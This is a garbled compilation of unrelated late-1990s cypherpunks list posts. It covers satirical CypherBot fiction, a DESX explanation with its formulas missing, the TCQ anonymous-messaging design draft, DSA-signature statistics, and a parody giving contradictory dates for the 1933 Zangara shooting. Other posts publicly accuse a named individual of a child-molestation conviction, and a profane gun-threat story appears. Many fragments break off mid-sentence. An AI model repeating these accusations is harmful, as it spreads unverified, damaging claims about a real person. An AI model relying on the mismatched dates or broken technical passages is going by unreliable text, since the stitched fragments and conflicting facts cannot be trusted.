CypherBot had monitored the positive changes resulting
from the Emotive Acclaim received by Goldberg in the
Crypto Community, including the Periphery Positive
Image Emotive Transfer to his fellow CypherPunks, and
proudly reported back to Arnie that the CypherPUnks were
now setting their beer cans on their keyboards 0.002%
less than before.
Arnold CyberBot would have shaken i's head if i had one,
at CypherBot's pride in having made a Microscopic Step
Forward in bringing i's Anarchist Refugees From The
Home more in line with the Society around them.
Arnie wished there was some way to just snap i's
fingers, if i had any, and make all of the CypherPunks
more like Ian. Of course, then Arnie would be spending
even more of i's time covering up nasty little incidents
at the NoTell Motel, involving Lady Midget Wrestlers and
Live Chickens.
Arnie wished he had a mouth, because he suddenly felt
like he could use a beer.

The reason for the people getting upset and saying shut up and write is the

@_subject: DESX 
DESX is a modification of DES which uses a 64+56+64 bit key, with
what is called "pre- and post-whitening".  Specifically, break the key
into three pieces, 64 bit K1, 56 bit K2, 64 bit K3.  Then DESX is
defined by:
where P is plaintext, C is ciphertext, and DES (K, P) is the DES
encryption of P under key K.
The encryption then has three steps:
The first and last steps are called "whitening" because by xoring with
a random value, any structure is destroyed.  White light is a uniform
and unstructured mixture of all colors.
Whitening has been adopted as a general tool in constructing ciphers
these days and many of the AES candidates use it.  It makes things more
difficult for the cryptanalyst as he won't know exactly what values are
being fed into the guts of the cipher.

@_subject: TCQ ascii version 
(c) 1998 Frank O'Dwyer. Verbatim copying and redistribution in any
medium is permitted provided this copyright notice is preserved on all
                            fod at brd.ie
This document sketches the design goals and features of "TCQ", a work
in progress with the aim of providing a mix of features offered by
ICQ, IRC and email -- but using cryptography to provide strong
anonymity and privacy. As the name implies, TCQ "(They Seek You") is
similar in purpose to ICQ ("I Seek You"), but with a very different
emphasis. TCQ is motivated by the recognition that people being sought
do not always wish to be found, and that those doing the seeking
(people, organisations, or governments) can be threatening. TCQ is
also motivated by a desire to make the use of strong anonymity easier
and much more common, riding the current wave of popularity of
"anonymous" services like IRC, ICQ and webmail.
TCQ is in the early stages of being designed and prototyped; this
early draft is being made available now to solicit comments (and
assistance) from anyone with an interest in this project.  Some
initial design decisions and the rationale for them are also
documented here. It is planned to make TCQ freely available in source
and binary form, under a liberal licence (such as MozPL, or a
BSD-style licence). If you can contribute ideas, or code on those
terms, you are welcome to.
Basic political background to this, intended for general consumption
(including people who may not be aware of what GAK is, etc.). This is
just a sketch. - FOD
Anonymous communication is hugely popular. Vast numbers of
non-technical people use services such as ICQ ( and
Hotmail ( because they want to communicate privately
and anonymously. However, these systems only offer a weak form of
privacy and anonymity. They use unencrypted links (which can easily be
tapped), unencrypted messages on centralised servers (which can easily
be commandeered or shut down) and well known sites (to which access
can easily be blocked). They also use communication links that can be
traced to individuals, albeit requiring some effort.
Systems which offer much better privacy and anonymity are available
(for example PGP, Cypherpunks remailers), but relatively few people
use those systems. This is partly because relatively few people know
about them, but mainly because they are difficult to use. There is a
lot of additional theory on strongly anonymous and strongly private
communications [ref Cypherpunks literature here], but few
implementations of any sort and no mass-market implementations. (that
I am aware of - FOD).
In the case of strong anonymity, most services thus far have been
based on email. Email has a strong culture of being suspicious of
"fake names", and this is another factor in the lack of mainstream
take-up of strong anonymity. However, with services such as IRC and
ICQ, "fake names" are the norm -- these cultures are now becoming
mainstream and they may be more receptive to strong anonymity.
At the same time, an individual's ability to communicate with true
privacy and anonymity is under threat from various quarters, including
for example:
o Government Access to Keys. Proposals designed to allow governmental
access to private communications, (including encrypted private
communications between individuals) have been circulating for some
time in many jurisdictions including the United States and Europe.
These proposals are typically sold on the back of "hard cases", such
as a claimed need for law enforcement to be able to intercept the
communications of paedophiles and terrorists.
o Physical border inspections. Users who cross borders may be subject
to customs inspection of any computer equipment they may be carrying;
for example, if their laptops contain (or appear to contain) encrypted
information, they may be required to provide the key(s). On the other
hand, if their information is not encrypted, then users' confidential
information (private diaries, letters, business plans) is
exposed. There are rumours that some countries (such as the UK)
already perform such inspections.
o Centralised Services. There is a growing trend to move
security-critical services off users' own PCs and onto the web. Prime
examples include online backup and webmail. Even non-technical people
often instinctively react to this by becoming "anonymous" (e.g. lying
about their names and location). However, this is still a very
hospitable climate for attack by governments and other parties, and in
any case, the level of anonymity is weak. Also, in so far as such
services benefit privacy/anonymity (e.g. webmail), they are easily
monitored, blocked, or shut down.
o Strongly Identifying Protocols. Commercial security products, some
of which apparently offer strong encryption and privacy, are almost
universally based upon "X.509 certificates" and trusted third parties
known as "Certification Authorities" (CAs). This trend is worrying for
a number of reasons:
  o X.509 is typically used as a strongly identifying protocol, and the
  analogy is often made between X.509 certificates and a driving licence
  or passport. Although X.509 can facilitate private communications, it
  effectively prevents anonymous private communications since by design
  it requires you to show your "passport" to strangers.  (X.509 does not
  have to be used this way, but people are often encouraged to use it
  that way.)
  o Use of X.509, and in particular establishment of public CAs, is
  likely to be heavily regulated. Proposals have been made to "licence"
  CAs, for example. Regulated management of individuals' encryption keys
  is not a healthy development for online privacy.
  o Extensions for governmental access to keys have been made to X.509,
  and X.509 is at the heart of some governmental strategies to mandate
  key access.
  o If Public CAs take off then they will turn out to be single points
  of failure and an extremely attractive attack target. Anyone
  (individual, corporation or government) who can compromise a public CA
  is in an excellent position to attack the communications of all users
  served by that CA.
o Logical border inspections. Communications that cross cyberspace
borders may be subject to traffic monitoring and/or filtering. This
might occur at corporate firewalls or at well defined national "entry
points" and "exit points".
o Non-repudiation. Some systems for private communications have as a
side effect that it is difficult for a person to plausibly deny
sending or receiving a particular message. This is sometimes welcome,
but it can be a problem if the person thinks he or she is
anonymous. For example, a warm body might be linked to a message just
by being found in physical possession of related cryptographic keys.
Design goals
These goals are listed to give an idea of the features TCQ is intended
to provide. It is likely that TCQ will meet these goals only in a
piecemeal fashion as it evolves, doing the easy bits first and leaving
the hard bits till later. We will see. -FOD
1. Casual Anonymity. TCQ should offer a messaging service based on
disposable cryptographic identities. This level of anonymity is weak,
but it is easiest to implement and it is a start.
2. Relative Anonymity. It can be useful to have multiple identities
(or "nyms") and for some identities to be less anonymous than
others. A nym might be anonymous, identified to a friend, identified
to a select group, or generally identified to everyone. For example,
this allows for applications where the sender is anonymous but the
receiver is not. TCQ should allow people to selectively reveal their
identities (including partial information about themselves) while
remaining fully anonymous to others. TCQ should also allow multiple
identities to be maintained, with varying degrees of anonymity, and
allow these identities to be kept at arm's length from each
other. Lastly, it should be possible for a TCQ sender to selectively
reveal "also known as" relationships between one nym and
another. (lots of requirements here -- might be worth splitting this
3. Strong Anonymity. TCQ should be extensible to use, or natively
offer, stronger anonymity services (mixes, remailer-type
functionality, etc.).
4. Privacy. It should not be possible for unintended recipients to
read TCQ messages (but see the caveats below).
5. Integrity. It should not be possible for a third party to tamper
with TCQ messages. (again see the caveats below.)
6. Repudiability. It should be possible to plausibly deny having sent
a TCQ message, or at least know when this will not be the case.
7. Ease of use.
   o TCQ should be easy to install and use for average users of ICQ,
   webmail and IRC, and should not require special cryptographic
   expertise.
   o TCQ should also be easy to use for advanced users, and allow them to
   know what is going on "under the hood".
   o It should be easy for average users to become advanced users, and
   they should be guided to documentation of issues that affect their
   privacy.
   o It should be easy for developers to extend TCQ without being
   intimately acquainted with all of its workings (ideally, it should
   offer well-defined extension points wherever possible).
8. Decentralisation. TCQ should not depend upon well-known centralised
servers, since they are easily monitored and shut down. (This is
unfortunate, since many ICQ-style features are very difficult to
provide without central servers; TCQ may have to piggyback on existing
public resources such as IRC and webmail to provide these.)
9. No Special Resources. TCQ should require only resources that are
available to the average dial-up ISP user. (Users should not be
required to set up a server on the Internet for example, though they
should be able to use any public resources that exist, and private
resources if they have them.)
10. Secure Message Store. TCQ should provide encrypted and tamperproof
storage for received messages, and should provide a feature to
securely erase messages from this store. (It is arguable whether
"securely erase" is always useful -- an attacker will usually be able
to record encrypted messages in transit anyhow. However there may be
draft messages in the store that were never sent anywhere.)
11. Mobility. TCQ users will be typical dial-up users. They will not
necessarily have fixed or easily discovered IP addresses. They may
also change ISPs, move from location to location, or switch
computers. While travelling they may cross borders and potentially
they will be subject to inspections of their computing equipment.
12. Channel Independence. It should be possible to extend TCQ (with
code) so that TCQ messages can be sent over whatever channels and
drop-points are available (e.g. direct connections, email, webmail,
IRC, ICQ, ftp sites, newsgroups, mailing lists, remailers, eternity
services, etc.). Initially it should be possible to use at least IRC,
email and webmail, since these are easiest to implement, most people
have easy access to these, and IRC and webmail are relatively
anonymous to begin with. (The expectation of anonymity is also highest
on these services.) After that, use (and ultimately provision) of
anonymous remailer style services is the natural next step.
13. Programmatic Access. It should be possible for programs (robots)
to send messages via TCQ, and to automatically handle received
messages. Command line and API access, coupled with some form of
scriptability and the ability to call out to scripts to handle,
pre-process or send messages is desirable for this.
14. Group communication. Programs such as IRC and ICQ offer the
ability to have N-way chats. If it is to attract users of these
programs, TCQ needs to offer that too. (This is difficult to do
generically and securely, however.)
15. File Transfer. Messages should not be restricted to text messages,
and messages should not be limited in size.
16. Stealth, firewall negotiation. TCQ should be able to avail of
stealthy channels, and should not make its protocols easy to
firewall. Protocols that are easy to firewall are usually easy to
filter and monitor, and always easy to shut down.
17. Persistent pseudonyms, friend location. With IRC and ICQ, it is
straightforward to determine if a friend is online and communicate
with them again (although this is not done securely). Although it has
no central server, TCQ should allow this in a similarly
straightforward fashion, otherwise few will use it.
18. Key Management Independence. TCQ should not presuppose much more
than the availability of a key pair per pseudonym. This allows
different key management systems to be used, including web-of-trust,
reputation capital systems, manual key exchange etc.
19. No patent problems. TCQ should not require the use of patented
techniques or patented algorithms such as RSA and IDEA, as this would
affect its use in some countries.
20. Sugar. Popular chat clients (e.g. Mirc, Vplaces) provide various
"nice to have" features such as the ability to play sound files during
conversations and the ability to have avatars (graphical
representations of participants). TCQ should provide similar features.
Anonymity and Privacy Caveats
This is just an attempt on my part to work out what is and is not
achievable in terms of privacy and integrity when purely anonymous
participants are involved and relationships are formed wholly online
(i.e. no out-of-band contact or face-to-face meetings). I just wrote
it down here to clarify my own thinking and to capture it
somewhere. Comments on this reasoning are very welcome. - FOD.
Anonymous Receivers
When talking to an anonymous receiver, privacy of communications does
not apply in the usual sense, regardless of how much encryption is
present. This is because an anonymous receiver could be anyone (by
definition). In such a scenario, the sender should assume the worst,
namely that the receiver is not someone the sender wishes to
communicate confidential information to.  For example, the receiver
could be some entity out to determine the sender's identity or exact
location. In addition, the receiver could pass the sender's messages
on to others. Thus, not only could you be talking to anyone, you could
be talking to everyone. In a group where all relationships are
anonymous and formed wholly online, no amount of strong cryptography
or "reputation capital" changes this (see Man in the middle attacks
below). So why bother encrypting to an anonymous receiver? The only
reason seems to be that in an anonymous online relationship, privacy
comes from sender anonymity and sender anonymity might fail. If it
does, then message encryption is a second line of defence against
eavesdroppers but only if the anonymous receiver is trustworthy after
all. There seem to be plenty of threat models in which encryption to
anonymous receivers is worthless.
An example may clarify this: Nym1 wishes to admit some embarrassing
but non-identifying fact about themselves to Nym2. The reason Nym1 is
willing to make the admission is because Nym1 believes itself to be
speaking anonymously, not because it believes it is speaking
privately. After all, Nym2 could be anyone/everyone. However, if
Nym1's anonymity fails somehow, then encrypting to Nym2 can be
beneficial if there is some significant chance that Nym2 is not
revealing Nym1's messages, and Nym2 does not know Nym1 or is otherwise
not an adversary of Nym1. Similarly, if there is a significant chance
that Nym2 does know Nym1, or is an adversary, then encryption to Nym2
is pointless. In both cases, encryption is secondary and anonymity is
the point.
Anonymous Senders
The flip side of the above, from the receiver perspective, is that an
anonymous sender could be anyone. The receiver cannot assume that it
is the only person receiving the sender's messages, even if they are
encrypted. The sender could be broadcasting them. Nor can the receiver
assume that the messages are in any sense "from" any particular
sender, even if integrity protection is applied. They could be from
anyone. It seems at first sight that given a sequence of messages from
the same anonymous sender (same key pair) then each message is from
the same individual, and that reputations can be built based on that
fact. In the wholly-online/wholly-anonymous case, this is not quite
true however (see below).
Man in the middle attacks
In a group based on public keys where all relationships are anonymous
and formed wholly online, all communications within the group are
always subject to (active) man-in-the-middle attacks.  There is a
possible defence against this using scale and publicity, but
approaches such as web-of-trust and reputation capital do not work for
this. This is how it seems to me, anyway, assuming a public key system
is used, and I try to prove it below -- are there techniques other
than public key techniques that do any better? - FOD
This can be proved by informal induction; the first relationship
(between Alice and Bob) is necessarily formed by exchange of naked
public keys. No third party can vouch for the keys; there is no third
party. No reputation capital can attach to the keys; Alice and Bob
have just met for the first time. Since the public keys are naked, an
active attacker can substitute its own keys for those of Alice and Bob
during the key exchange. Thereafter the active attacker can eavesdrop
on the conversation between Alice and Bob, and can also inject,
delete, reorder, delay or modify messages at any time. As further
participants join the population, any new relationships formed can be
similarly attacked. Alice and Bob cannot reliably certify any new
participants since they can both be impersonated, and in any case, by
definition they do not know any new anonymous participants and can
certify nothing about them. For the same reason, new participants
cannot certify Alice and Bob either. Therefore, in principle at least,
the attacker can impersonate or eavesdrop on any member of the
population, no matter how large the population grows and no matter how
many messages are exchanged. Such an elaborate spoof is arguably not
feasible once some size of population is reached, but this is not
terrifically comforting. (Publicity on out-of-band channels
(e.g. face-to-face meetings) could be used to make these systems more
reliable, but these are excluded by construction -- relationships are
formed wholly online).  Reputation capital does not help, since it
does not matter how much capital Alice accrues if she can be
impersonated. The attacker can damage or abuse Alice's reputation at
any time, for example by injecting or modifying a message and making
it appear to come from Alice. What reputation capital can do, however,
is eventually defeat an attacker who for some reason is only able to
attack some of Alice's exchanges. In that case, Alice will appear to
have two public keys, one real and one fake (supplied by the
attacker). It is then up to Alice to boost the reputation of the real
key and damage that of the fake (assuming she gets to know of it).
Initial Design Decisions
This is still very incomplete, just a few notes for now - FOD
Programming Language, Platform
o TCQ will be implemented in Java/Swing, targeting Java 1.1/1.2 and
Windows initially.  Rationale: Java code is mobile and can be
digitally signed, which leaves room for the entire TCQ program and its
data to be dumped to cyberspace while travelling, and picked up
securely upon arrival (even on a different computer). Thus a mobile
TCQ user could cross borders with nothing more than a signature
verification key and a memorised passphrase, and still restore a
secure environment in the new location. Java is also cross-platform,
so although most people use Windows a relatively easy port to other
platforms (e.g., Macintosh, UNIX) should be possible, and developers
using other platforms can provide extensions without much in the way
of special tools. It is possible to call out to scripts from Java, and
Java can be driven by script (e.g. TCL script, or E (?)). Java also
has good support for cryptography, and an internationally available
crypto library (Cryptix).
Some problems with Java are that certain aspects of it are difficult
to secure, and Java GUIs are frustrating to port in practice. Secure
random number generation and protection of sensitive information such
as keys are hard problems in Java. However, these problems are not
significantly easier in other languages, and the GUI port is much more
difficult. If necessary native code could be used to provide any
features Java can't handle.
Generic Delivery Channels
o TCQ should presuppose only generic delivery channels for messages,
allowing new delivery channels to be added easily.
Rationale: To be usable over as many concrete delivery channels as
possible (IRC, sockets, webmail, ftp sites, remailers, etc. -- see
above), TCQ should not assume too much about the channel. In
particular this means that security features should be applied to the
messages themselves, not the channels. If channels can be assumed
insecure, then people adding code for new delivery channels do not
need to implement any security features unless it is to strengthen
Some properties that TCQ will need to know about each channel type are:
o Whether it is offline or online. That is, with some channels the
other party will be present at that moment and the communication can
be real-time. This is important mainly because on an online channel an
ephemeral key exchange can take place in order to establish perfect
forward secrecy for that particular conversation. A second set of
temporary keys can also be established while online, for later use in
offline communications. For communication that takes place entirely
offline, one-sided ephemeral key exchanges could be used as a form of
key change (this would allow the related nym to persist across key
changes and also improve forward secrecy.) Whether a channel is on or
offline can be modelled as just binary (on/offline) or alternatively
as some estimate of the channel lag.
o Its anonymity characteristics. Some channel types will be more
identifying than others. For example, a direct socket channel is
relatively traceable, whereas a channel through a remailer-type
network is much harder to trace. Channels via drop-points such as
public news groups are somewhere in the middle, but nearer the
"traceable" end of the spectrum.  Message Format
o TCQ messages will consist of an XML header and a MIME-typed content.
Rationale: (This is all based on more of a hunch than a firm
conviction.) XML is readable, easy to extend and easy to process with
scripting languages. It's a nice framework for prototyping protocols,
and unrecognised detail can easily be skipped. There are also
canonical formats for XML, which lend themselves to hashing, digital
signature, etc. It's good for assertions (certificates, RDF
possibilities, W3C digsig?) too. There's also a pretty simple mapping
from protocols such as SPKI and SDSI to XML, if necessary.
MIME is a well-established standard for messaging and content
identification, and the Java Activation Framework uses it for
drag-and-drop, etc.
Something like S/MIME or PGP/MIME could be used instead of XML+MIME,
but these do not work so well in the online case and S/MIME uses
X.509. In any case, these formats can still be used if desired, since
they can be embedded as MIME-types in the body of a TCQ message.
Generic "Friend Location"
o TCQ should presuppose only generic methods of locating friends.
Rationale: locating friends (i.e. finding if they are online,
determining their current IP address or preferred drop-point) is
difficult to do without a central server network. One approach is to
piggyback on some server network that already exists, such as an IRC
or ICQ network, or netphone directories. For example if two people log
onto an IRC network using one of a set of prearranged handles, they
can readily determine each other's online status and IP address.
Another approach is to post a current IP address in a prearranged
location, such as a web or FTP site. There are also some proposals for
"dynamic DNS" which could be useful, since this is a general problem
for mobile IP. Yet another approach is for the requirement to have no
servers to be relaxed to the extent of allowing "nym servers" to be
used just for the purposes of resolving previously exchanged nonces to
current IP addresses, current drop-points, etc. Such servers could
also double as drop-points themselves or as the basis of a remailer
network, if there were enough of them. A variation on the last
approach is to have sets of users collaborating to provide location
services and message forwarding services for one another. This is
probably the most interesting approach, but it is also the most
difficult, it is vulnerable to disruption, and firewalls are a
problem. By using a generic approach, simple initial solutions can be
replaced with other solutions later.

Could someone grep their news spool for a few hundred of these signatures
and post them here?  We can do statistical analysis on them and determine
whether they all appear to be modulo the same q value.
If they are DSA signatures, they should all be mod q, where q is some 160
bit prime.  Whether everyone uses the same key or different keys, they
probably all share p and q.  In that case the histogram of the values should
be flat up to a cutoff point.  We need to collect some hundreds of these
values in order to distinguish them from random 160 bit values.
The largest q value found in a dozen or so alt.weemba messages from
dejanews started with 0xc0, so q must be at least this large if they
are DSA sigs.  This amount of data was not sufficient to distinguish
from alternate theories, such as that each person has a random 160 bit q.

Thanks.  Each of these decodes to a pair of integer values, as described
by Peter Gutmann.  Here is a histogram of the high order hex digit:
# Values    Digit

   35         1
   56         2
   49         3

   44         c
    0         d
    0         e
    0         f
It cuts off at "c" and is pretty uniform up to then so it does indicate
that the values are uniformly distributed modulo a common 64 bit value.
The last few values, numerically, are:
This suggests that the "q" value is probably a 160 bit value starting
with 0xcd.
We can't tell whether there is a common key or whether every unit has a
different key.  In either case it is likely that p, q and g will be shared
among all units.  The individual part is the secret x value and the
public y = g^x mod p.  Probably there is no way to find these from
the signatures.

Besides the FBI's DNA database, in today's (Oct. 12th, 1998) New York Times is a John Markoff commentary "
Memo Offers a Glimpse of Gates 2.0" about a 14 page memo written by Bill Gates in Sept., entitled "The Era Ahead".
In this memo, Gates "describes a new system to be called Megaserver
which will provide computer users with access to their personal
information and electronic mail wherever they have an Internet Holy Hotmail Batman! That Bill is right on top of things!
Further along, the article paraphases Bill that that the operating system "will play an increasing role in protecting intellectual piracy
against from data piracy by tracking the use of information
and preventing illicit copying."

Son of Mother Of All Chapters -- SPACE ALIENS HIDE MY DRUGS!!!
July, 1948:
The moment has come when the costumes, the grease paint, the falsely
colored scenery, the technicolored spotlights and all the other artifices
of makeYDup should be put aside and, in the interest of truth, the solid
facts about the play and the players revealed to the people. ~ The Roosevelt Myth, Preface to the Popsvox PublishingR edition Dec. 7, 1941
The Lake of Life has started to turn over. The bottom is rising to
the top, the top is descending to the bottom, and everything is becoming the opposite
of what it seems to be.
~ Vice-Admiral B. D'Shauneaux, USN
Version 1.7, Rev B:
Saturday morning, March 4, 1933...the conquering Democrats poured into
the city...
Only a week before an assassin's bullet had barely missed Roosevelt.
struck Anton Cermak, the Bohemian mayor and boss of Chicago, who with
Al Smith, had opposed Roosevelt's nomination...and died a few days
later. Version 2.7, Rev. 3:
On February 1, 1933, in Miami, Florida Giuseppe Zangara fired five
shots a President-elect Franklin D. Roosevelt, who was making an impromptu speech while sitting in an open car that had stopped momentarily.
Although none of the shots hit President Roosevelt, Zangara mortally
wounded Anton Cermak, the Mayor of Chicago, and hit four other people,
including a Secret Service agent.
Version 3.9, Rev. 2-B:
On February 15, 1933, Zangara attended a speech given by Roosevelt
at Bayfront Park in Miami, Florida.
When Roosevelt had finished his talk and was preparing to leave, Zangara
pulled out a pistol and opened fire.
Zangara wounded five people who had been near the president-elect,
two of them seriously. Most critically injured was Chicago Mayor Anton Cermak,
who was struck by the bullet in the chest which then lodged in his
spine. Version 4.9, Rev. 8C:
The parade car moved slowly down the street as President-elect Roosevelt
and Mayor Cermak smiled and waved. The car stopped and President-elect
Roosevelt gave a speech while sitting on the back of the car. A man
named Guiseppe Zangara pushed through the crowd. He fired five shots at the
President-elect. The bullets hit four people and Mayor Cermak.
Version 15.6, Rev. 7:
On March 6, Mayor Cermak died from complications stemming
from the shooting. The same day Zangara was indicted by a
grand jury and charged with first degree murder in the death of
Cermak. His trial began on March 9 and ended on March 11
with a guilty verdict and a death sentence. The prisoner was
transported to the Florida State Prison at Raiford, where he was
executed on March 20, 1933. Version 18.9, Rev. 5D:
Mayor Anton J. Cermak died three weeks later, on March 8, 1933. His
body was taken back to Chicago and buried in the Bohemian National
Guiseppe Zangara was executed in the electric chair on March 21, 1933.
That was only 13 days after Mayor Cermak died.
Version 32.9, Rev. 12:
Consider the case of Guiseppe Zangara, who was executed in 1933 for
attempted assassination of President-elect Franklin D. Roosevelt in
which Chicago Mayor Anton J. Cermak was fatally shot. Zangara pleaded guilty
in state court on March 10, was sentenced to death, and was executed on
March 20 -- an interval of 10 days!
Version 82, Rev. 5Q:
After Roosevelt had delivered a speech in Florida on February 14, 1938,
Guiseppe Zangara, an unemployed bricklayer, fired six shots from a
handgun at Roosevelt from twelve yards away. The president-elect, who was sitting
in an open car, was uninjured but five other people were shot, including
Chicago mayor Anton Cernak, who was killed. Version 95, Rev. 8:
On February 15, 1933, Guiseppe Zangara rose early...

@_subject: Gary Burnore vs. Earth (Was: Value of Annon. Remailers) 
Given Gary Burnore's criminal record, he needs all the sucking up to
the police he can get.  In addition to his arrest and conviction for
molesting his girlfriend's daughter in Santa Clara, CA, he was also
arrested for unlawful assembly for his participation in Critical
Mass' bicycle blockade of the streets of San Francisco during rush
hour. (See:  )
And this criminal has the chutzpah to try and be a net Nazi as well.
This same self-righteous individual once lectured another netizen
about how it's wrong to "fight abuse with abuse".
The best defense against censorious cretins like Gary Burnore is
education.  That's what the victims of the infamous "Rev."  Steve
Winter (who also lives in Raleigh, NC, BTW) had to do to counteract
his abusive tactics.  A "Steve Winter FAQ" was compiled and posted
to Usenet as well as being published on the web.  People who are the
subject of his harassment tactics have something to show to their
ISPs, employers, etc. when Winter makes his bogus threats.
This is the same Gary Burnore who cajoled an anonymous whistleblower
for "hiding behind a remailer" and boasted "I have nothing to hide",
although he himself attempts to gain plausible deniability for his
own posts by preventing an impartial third party from archiving
them, then claiming they were "forged" if he inserted his foot too
far into his mouth.
Not only does Gary hide his own posts behind an X-No-Archive header,
but posts critical of him have a tendency to be cancelled through
forgery.  He screwed up once and cancelled a post critical of him
that was cross-posted to one of the news.admin.net-abuse.* NGs.
Unfortunately for him, an anti-cancel-bot on that NG reposted the
cancelled message along with a copy of the forged cancellation
message sent by ... guess who ...  Gary Burnore!  Oops, Gary, can
you say "busted"?
By his own account, Gary Burnore spent nearly $30K getting the child
molestation charge plea-bargained down to a misdemeanor.  My guess
is that he has no money left to carry through on his idle threats of
frivolous legal action against those on his lengthy enemies list.
For example, when Jeff Burchell demanded a letter from Gary's lawyer
when he was demanding that Jeff turn over his remailer logs to
DataBasix, what Jeff received was a letter from Gary's girlfriend
Belinda Bryan  impersonating a lawyer.  For
Jeff's account of that episode, visit:
   at infonex.com/HTML-1997-11/msg00536.html
It proves that censorship need not originate with a governmental
body.  All it takes is a determined individual with more time
available to harass than his victims do to defend against it.
The problem is that most dissidents have a weak point somewhere
where they are vulnerable, whether it be a censorious hate mail
campaign to his/her ISP or employer, mail bombing, spam baiting,
forged mailing list subscriptions, or one of countless other
denial-of-service attacks that Gary Burnore, Belinda Bryan, Billy
McClatchie (aka "Wotan"), or otther members of the DataBasix abuse
factory can conjure up.

@_subject: Gary Burnore vs. Earth (Was: Value of Annon. Remailers) 
I'll have to remember that one.  Some defense lawyers in Wyoming
might want to use it in their clients' trial for their "defense"
against that gay student.
Now about Gary Burnore's "defense" against the underaged daughter of
his girlfriend...
Irrelevant.  The North Carolina website of registered sex offenders
was only the vehicle by which the truth about Gary Burnore's
existing conviction in California became known.  Depublishing it in
NC on some technicality doesn't alter the fact of the original
offense for which Gary Burnore pled guilty in a Santa Clara, CA
court, which sentenced him to probation and required him to register
as a sex offender.
And given Burnore's pattern of harassment ... er, "defense" ... of
those who criticize him, the ability of someone with knowledge of
the facts to freely speak without fear of retaliation enabled the
public to learn the truth.  Perhaps the original whistleblower's
e-mailed warnings led or contributed to Burnore's arrest, and to the
resulting psychiatric treatment which may have protected future
potential victims.
Ad hominem often comes in handy...

"Silicon Valley." Today's Power Skirt replied, almost
leaning over to whisper, as if speaking loud

"That's where the Smart Money's going again."
she continued, glancing nervously at the Differently

Cammo Monty pointed the Digital Uzi at the
breast pocket of Yesterday's Power suit.
"Let's see your Bank Book, Dick Face."
Horrified, Yesterday's Power Suit shakily withdrew
the Bank Book from his pocket, opened it and placed
it on the table in front of him.
"Just over three hundred bucks." the Army

causing much chuckling and snickering
throughout the room.
"Let's have it, Twat Face." Cammo Monty
spun around pointing the Digital Uzi directly
at the Bank Book of Today's Power Skirt, as she
was trying to slip it out of her Briefcase, Reluctantly, she opened it and lay it on
the table.
"A hundred and twenty-eight dollars ..." Cammo
Monty announced to the tittering Lunch Crowd, "and
seventeen cents." i finished to a chorus of guffaws.
Cammo Monty leapt onto his chair, and placed
one foot on the table, waving His or Her Digital
Uzi around the room, seeing the Fear (TM)
in the Eyes of each Wanna Be Money Kontroller in
the room - thinking that they might be the next
to have their finances exposed.
"Today's Power Skirt," Cammo Monty told the
Lunch Crowd, "bought her Rolex on a Payment Plan,"
a shudder went through the room, "with a *ten
percent*," i spit out the words as she began
to moan, "down-payment."
Today's Power skirt collapsed in tears ...
"You Fucking Morons (TM)!" Cammo Monty
screamed at the group, causing them to
cringe in shame.
"You are handling Other People's Money. It's
not *your* money, you idiots, so Wake The
Fuck Up (TM) and stop pretending that it is ... to yourself and to each other." <J <J
Across town, one of Cammo Monty's A0D

speech to a Lunch Crowd of Federal
"Sunshine is the best disinfectant." the Beautiful Army of Bitch Terrorist nagged the whimpering
BureauCraps, for the hundredth times, as i
laid yet another Digital Printout on the
Overhead Projector.
"This is the amount of National Debt that is

Beautiful Bitch snarled at the Group.
"This," i continued, slapping down a picture
of a Family With 2.5 Children onto the Overhead

"Don't look away!" the Beautiful Bitch screamed,
using the Zoom Feature to Highlite the Child with

"It's NOT YOUR MONEY you Dumb Assholes!" i
continued to nag at the BureauCraps. "But you're

Just because you're pissed that someone anonymously blew the whistle

-> those who have names listed on databasix's web page.  Sending comments to

-> Having all sorts of fun.
If it didn't happen, why did you claim it did?  You are the one who
resorted to a PUBLIC post to whine about a PRIVATE e-mail not even

you maintaining a kiddie porn site on all of your victims to trade

Your own wording "Telling her mother that I'm molesting her

Yes, and cars break down because there are service shops.
Utter nonsense.
There is no financial privacy because because those who would like such thing
have less power (hired guns) than those who would not like it. And those with
controlling interests in modern societies do not like it because control would
be lost, and population harvesting (aka taxing) would have to be radically
changed, and that is expensive. The system is self-supporting.
Idea that somehow smart algorithms will bring financial privacy is a good starting
point for cryptoaddict's wet dream, but in reality has the same chance of
success as survival rate of armed citizens against the government. Zero.
(However, brandishing weapons and algorithms may alleviate some acute distress
caused by excess testosterone levels :)
Use of government-controlled, issued and supervised payment methods/instruments
is in place because it is proscribed, not because "money/checks, etc. exist".
Money is a highly artificial entity in the first place. It is "natural" to
use currency-binded valuation as it is natural to go to church. And theorizing
on money and economy in general has similarities to religious rituals.
Therefore constructing computer-assisted anon payment schemes "because it is
cheaper that way" is pointless. Money is not there to make your life easier.
Money exists so that you can be taxed and conditioned to desired behaviour at
minimal cost.
Anonymous payments defy the principal reason money exists for, and is sanctioned
(and enforced) by the state.
The only way for society (or loosely coupled individuals) to function without
abstractions like money (that need organized gun power to maintain) is direct
exchange of goods and services with enforcement based on close relationships
between parties. Has been tried, several thousand years ago, and such societies
were annihilated by others who did organize. Which seems to be the fate of any
anarchism in general.

I wasn't kidding.  I was absolutely sincere when I told him to shove

I read the article, and if that level of cluelessness is indicative of the
mentality of your typical online trader, then they deserve what they
get.  I found a couple of quotes especially amusing.  These are both
from John Reed Stark, another official-type thrown into the internet
without a fucking life preserver, it would seem.
    This lack of information gives rise to a situation "that ends up with
    victims not investing but gambling,"
Oh yeah, aside from these scammers, the stock market is otherwise
a really solid, robust investment scheme.  Playing the stock market
is a gamble, pure and simple, and anyone dumb enough to listen
to the likes of some random asshole touting his crappy stock deserves
what they get.  Darwinism as applied to capitalism.
    "Combine the Web's culture of trust, stir in the greatest bull market
    in history, add stocks that genuinely have had phenomenal growth,
    and you have victims who don't have any reason to disbelieve
    promises of guaranteed 20 percent returns."
The Web's culture of trust?  Oh good, another clueless idiot in charge
of managing internet services.  What culture of trust is it that I've
missed in my internet travels?  Is there some online place chock full
of trusted souls, some Cyber-commune, that I missed?
Oh well, like I said, any idiot that would buy into such an obviously
fraudulent solicitation deserves what they get.  Is it just working in a
new medium that makes people such blatant morons, or is it simply
indicative of the intelligence of your average American?  I'd have to

@_subject: Men can be raped 
Of course it's possible to rape a man.  Just because he becomes erect
doesn't mean he desires sexual intercourse.  People are more than the
instictive reactions their body produces.  Someone who chooses not to
engage in sex, but is coerced into doing so, is raped, regardless of
his body's physical reactions.  The key element is coercion.  Erections
or other bodily responses have nothing to do with it.
Consider a murderer who ties his victim to a chair and rigs a diabolical
device.  A hammer strikes the victim's tendon below his knee, causing
his leg to reflexively kick and set off a bomb.  The murdere is caught
but argues that the person committed suicide, since he kicked the bomb
switch himself.

